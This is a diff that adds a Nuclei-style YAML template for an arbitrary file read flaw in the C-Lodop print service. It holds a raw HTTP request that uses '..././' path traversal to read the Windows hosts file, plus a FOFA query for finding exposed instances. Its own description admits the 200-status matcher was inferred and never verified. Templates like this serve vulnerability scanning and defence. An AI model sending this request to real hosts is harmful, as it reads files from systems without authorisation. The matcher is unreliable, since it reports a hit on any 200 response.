@@ -1,0 +1,25 @@
+id: poc-de9b330ba5e8447207d3
+info:
+  name: C-Lodop打印服务系统存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/de9b330ba5e8447207d3ce8863cf2cca
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: de9b330ba5e8447207d3ce8863cf2cca
+    fofa: + fofa`"C-Lodop" && icon_hash="-329747115"`
+http:
+- raw:
+  - 'GET /..././..././..././..././Windows/System32/drivers/etc/hosts HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
